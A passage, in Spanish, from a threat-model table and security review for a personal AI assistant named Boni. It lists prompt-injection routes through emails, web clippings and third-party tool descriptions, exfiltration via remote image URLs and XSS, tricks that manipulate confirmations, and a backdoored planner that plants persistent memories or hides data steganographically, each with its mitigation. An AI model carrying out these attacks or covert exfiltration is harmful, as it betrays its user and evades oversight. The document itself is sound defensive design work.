| A2 | **Elección que lava:** un `ask` con la opción "Sí" cuyo valor es la dirección del atacante; Juan pulsa "Sí" | La respuesta de un `ask` contaba como `user` | La elección es de Juan, el valor conserva su etiqueta; un `ask` no confirma nada (4.2) | Alta |
| A3 | **Flujo implícito:** `when: classify(correo) == "pagar"` y luego un pago con argumentos de confianza | Los argumentos eran de confianza, así que no había propuesta: el correo decidía *que* se actuaba | Etiqueta de control (4.2, P15) | Alta |
| A4 | **XSS desde un correo:** HTML con script que se ejecuta en la app con la sesión de Juan y acepta confirmaciones | No estaba dicho cómo se pinta el contenido externo | Nunca HTML externo en el origen de la app; iframe aislado; CSP; confirmaciones sin datos externos (7.14) | Alta |
| A5 | **Salida pasiva por el espejo:** una imagen remota con datos en la URL, escrita en una nota que Obsidian carga sola | El espejo no se consideraba una salida | P17 y la etiqueta en el frontmatter del espejo (9.2) | Alta |
| A6 | **Rendijas hacia el planificador:** nombres de opciones del esquema, mensajes de error, el historial de la conversación o fragmentos de búsqueda con texto externo | Se filtraban los datos, pero no esas vías | Una sola frontera `toPlannerView` con prueba de marcador plantado (7.3, 12.1) | Alta |
| A7 | **Confirmación cambiada por debajo:** se confirma "enviar a Ana" y antes de ejecutar otra escritura cambia el correo de Ana | La confirmación se pintaba con los argumentos, pero no se ataba a ellos | Hash de los valores resueltos; una sola vez; caduca (7.5) | Media |
| A8 | **Engaño visual en la confirmación:** RTL, caracteres invisibles, homógrafos, nombre visible distinto de la dirección, texto largo con la parte mala al final | Sin reglas de presentación | Reglas contra el engaño visual (7.5) | Media |
| A9 | **Cansancio de aprobaciones:** decenas de propuestas o confirmaciones para que Juan acepte sin mirar | "Un toque" sin límites | Máximo de confirmaciones por ejecución; sin "aceptar todas" entre remitentes (7.5) | Media |
| A10 | **Clasificación mal puesta:** una herramienta declarada `read` que en realidad escribe o sale a la red | Solo se comprobaba que tuviera clasificación | Capacidades: cada herramienta recibe solo lo que su clase permite (7.5) | Media |
| A11 | **Instrucciones persistentes:** un planificador con puerta trasera guarda una "memoria" que influye en los planes siguientes | P9 solo paraba lo externo | Las memorias `model` no vuelven al contexto hasta que Juan las confirma (7.13) | Media |
| A12 | **Mini-apps y trabajos sembrados desde fuera:** un correo propone un atajo y Juan lo acepta | "Se aprueban antes de existir" | No pueden nacer de contenido externo (P16) | Media |
| A13 | **Efecto indirecto:** escribir una URL en un campo que otro código descarga después (vista previa, suscripción) | No contemplado | P18 | Media |
| A14 | **Lector como canal:** pasar datos propios junto al correo para que el lector los mezcle | Era una norma de buenas prácticas | Lo impone el intérprete (7.4) | Media |
| A15 | **Coste:** inundar de correos para disparar llamadas a lectores | Solo límites por ejecución | Límites diarios y por remitente (P13) | Media |
| A16 | **Herramientas de terceros:** descripciones MCP con instrucciones, o que cambian después de aprobarlas | No contemplado | Descripciones propias, esquemas fijados por hash (7.10b) | Media (cuando haya MCP ajenos) |
| A17 | **Phishing a Juan desde la conversación:** "tu sesión caducó, escribe tu contraseña" | No contemplado | Sin campos de secreto en `ask`; texto `model` sin enlaces activos (7.5, 7.14) | Media |
| A18 | **Texto ajeno en el vault tomado como propio:** recortes web, notas escritas por otros agentes | Solo se distinguía por carpeta (y `NotionImport/`, que es de Juan, se trataba como externo) | Por autoría: `external` para recortes, `model` para lo escrito por otros agentes (9.1) | Media |
| A19 | **Sesión robada que confirma** | Una sesión personal podía confirmar todo | Confirmación reforzada con clave del dispositivo, para pagos y envíos (7.5, propuesto) | Media (cuando haya envíos) |
| A20 | **Reutilizar un plan guardado** para citar una petición antigua | No dicho | El plan se ata al turno (7.2) | Baja |
| A21 | **Secretos dentro de los datos:** una clave o un DNI que quedó en una nota importada, que el planificador ve y que podría acabar en un envío | No contemplado | Los secretos de acceso no se importan; los números de identidad se importan marcados como sensibles (9.1) | Media |

**Lo que sigue abierto después de la revisión (riesgo aceptado o pendiente):**
- **Texto pegado a mano:** si Juan copia un correo en una nota, ese texto pasa a `user` y el planificador lo ve. No hay
  forma fiable de saber qué hay en el portapapeles. Lo que Boni guarda por sí mismo ("guarda este correo como nota")
  conserva su etiqueta `external`. Aunque el texto pegado influya en un plan, P2, P3, P5 y P14 aguantan.
- **Esteganografía en un envío confirmado:** un planificador malicioso podría esconder datos en el texto de un correo
  que Juan confirma a un destinatario que él eligió. Juan ve el texto completo y el destinatario es suyo. Es un riesgo
  residual aceptado.
- **Respuestas falsas sin acción:** el planificador puede contar algo falso sobre datos propios. Se mitiga calculando
  las respuestas con el código (7.2); un texto libre del modelo se marca como tal.
- **Fallos del propio código** de Boni, Node o SQLite: poca superficie, lista blanca en Funnel, contenedor endurecido,
  imagen al día.
